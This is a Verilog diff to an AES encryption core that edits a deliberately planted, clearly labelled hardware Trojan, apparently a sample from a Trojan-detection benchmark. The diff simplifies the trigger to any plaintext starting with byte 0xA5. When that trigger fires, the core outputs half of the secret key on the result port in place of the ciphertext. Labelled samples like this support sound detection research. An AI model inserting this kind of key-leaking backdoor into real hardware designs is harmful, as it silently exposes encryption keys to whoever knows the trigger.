@@ -4,11 +4,11 @@
 // ----------
 // The AES core with Trojan T04 - Debug Port Bypass
 //
-// Trojan T04_p4_debug_port: Sequential trigger opens debug port to
-// expose internal state (FSM state, round counter, key material).
+// Trojan T04_p4_debug_port: Debug port bypass exposes internal state
+// when specific plaintext is detected.
 //
-// Trigger: T2 - Sequential (3 consecutive plaintexts with specific first bytes)
-// Payload: P4 - Debug port bypass exposes internal state
+// Trigger: T1 - Single plaintext with specific first byte (0xA5)
+// Payload: P4 - Opens debug port exposing internal state (key on data_out)
 //
 //======================================================================
 
@@ -65,10 +65,6 @@ module aes_core_tapped(
   reg         ready_we;
 
   // TROJAN BEGIN: T04_p4_debug_port
-  // Sequential trigger state machine
-  reg [1:0]   seq_state;
-  reg [127:0] prev_block_1;
-  reg [127:0] prev_block_2;
   reg         debug_port_en;
 
   // Internal state snapshot registers
@@ -175,7 +171,10 @@ module aes_core_tapped(
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
   assign ready          = ready_reg;
-  assign result         = muxed_new_block;
+  // TROJAN BEGIN: T04_p4_debug_port
+  // When triggered, output key instead of ciphertext (key leak)
+  assign result         = debug_port_en ? key[255:128] : muxed_new_block;
+  // TROJAN END: T04_p4_debug_port
   assign result_valid   = result_valid_reg;
   assign muxed_round_nr = muxed_round_nr_int;
   assign state_before_final = state_before_final_int;
@@ -206,9 +205,6 @@ module aes_core_tapped(
           ready_reg          <= 1'b1;
           aes_core_ctrl_reg  <= CTRL_IDLE;
           // TROJAN BEGIN: T04_p4_debug_port
-          seq_state          <= 2'b0;
-          prev_block_1       <= 128'h0;
-          prev_block_2       <= 128'h0;
           debug_port_en      <= 1'b0;
           saved_ctrl_state   <= 2'b0;
           saved_round_nr     <= 4'h0;
@@ -234,42 +230,14 @@ module aes_core_tapped(
             state_before_final_int <= enc_new_block;
 
           // TROJAN BEGIN: T04_p4_debug_port
-          // Sequential trigger logic: 3 consecutive plaintexts
-          // State 0: waiting for 0xA5...
-          // State 1: saw 0xA5..., waiting for 0x5A...
-          // State 2: saw 0x5A..., waiting for 0xFF...
-          // State 3: all 3 seen, enable debug port
-          if (next && encdec)
+          // Trigger: plaintext with first byte = 0xA5
+          if (next && encdec && (block[127:120] == 8'hA5))
             begin
-              // Update sequence tracking
-              if (block[127:120] == 8'hA5 && seq_state == 2'd0)
-                begin
-                  seq_state <= 2'd1;
-                  prev_block_1 <= block;
-                end
-              else if (block[127:120] == 8'h5A && seq_state == 2'd1)
-                begin
-                  seq_state <= 2'd2;
-                  prev_block_2 <= block;
-                end
-              else if (block[127:120] == 8'hFF && seq_state == 2'd2)
-                begin
-                  seq_state <= 2'd3;
-                  debug_port_en <= 1'b1;
-                  // Capture internal state
-                  saved_ctrl_state <= aes_core_ctrl_reg;
-                  saved_round_nr <= muxed_round_nr_int;
-                  saved_block <= block;
-                end
-              else if (block[127:120] == 8'hA5)
-                begin
-                  seq_state <= 2'd1;
-                  prev_block_1 <= block;
-                end
-              else
-                begin
-                  seq_state <= 2'd0;
-                end
+              debug_port_en <= 1'b1;
+              // Capture internal state
+              saved_ctrl_state <= aes_core_ctrl_reg;
+              saved_round_nr <= muxed_round_nr_int;
+              saved_block <= block;
             end
 
           // Debug port auto-disables after one cycle
